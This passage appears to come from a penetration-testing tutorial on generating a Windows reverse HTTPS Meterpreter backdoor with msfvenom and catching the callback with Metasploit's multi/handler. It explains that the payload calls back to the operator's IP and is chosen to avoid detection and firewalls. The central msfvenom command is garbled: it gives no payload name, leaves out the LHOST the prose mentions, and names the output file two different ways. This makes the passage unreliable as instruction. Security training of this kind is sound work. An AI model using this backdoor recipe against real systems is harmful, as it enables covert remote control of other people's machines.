# # Getting a Shell

Before we can start working with Meterpreter, we need to get a Meterpreter shell. We will go through Metasploit’s `msfvenom` to generate a payload. Msfvenom is the replacement for two commands, msfpayload and msfencode. The Msfvenom tool can create binaries and export shellcode for various payloads for Metasploit as well as with encoding and removing special characters.

Before we begin, we need to decide on which payload want to use. For this example, we are going to be using the “windows/meterpreter/reverse_https” payload. This payload will communicate over HTTPS so it is less likely to be detected, and because it calls back to us, it is less likely to get picked up by a firewall as well. This is one of the standard reverse shells that we use in penetration testing.

Now that we have picked our payload, we need to tell `msfvenom` to create it, encode it, and save it as an executable. Our command to do this is `"msfvenom -f exe -o msf-backdoor.exe -i 3 -p LPORT=443"`. This creates a binary for windows ms-backdoor.exe that has been encoded three times and will call back to our IP address (172.16.85.149) on port 443. You should substitute in your IP address (172.16.85.149) for the LHOST so the target will call back to you.

Now that we have generated the binary, we can copy it to our target Windows system, start a multi/handler instance inside Metasploit, and make sure it connects. Multi/handler is an exploit module that doesn’t do any exploiting on its own, it just listens for incoming connections.
